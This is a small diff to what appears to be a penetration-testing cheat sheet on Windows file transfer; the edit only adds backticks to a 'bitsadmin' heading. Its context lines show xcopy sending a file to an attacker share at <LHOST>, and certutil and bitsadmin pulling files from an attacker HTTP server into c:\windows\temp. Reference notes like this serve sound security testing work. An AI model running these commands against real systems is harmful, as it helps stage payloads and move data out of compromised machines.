@@ -45,7 +45,7 @@ xcopy c:\windows\temp\test.txt \\<LHOST>\<SHARE_NAME>\test.txt
 ```shell
 certutil -f -urlcache HTTP://<LHOST>:<LPORT>/<FILE_NAME> c:\windows\temp\<FILE_NAME>
 ```
-## using bitsadmin
+## using `bitsadmin`
 ```shell
 bitsadmin /transfer myDownloadJob /download /priority high http://<LHOST>:<LPORT>/<FILE> c:\windows\temp\<FILE_NAME>
 ```
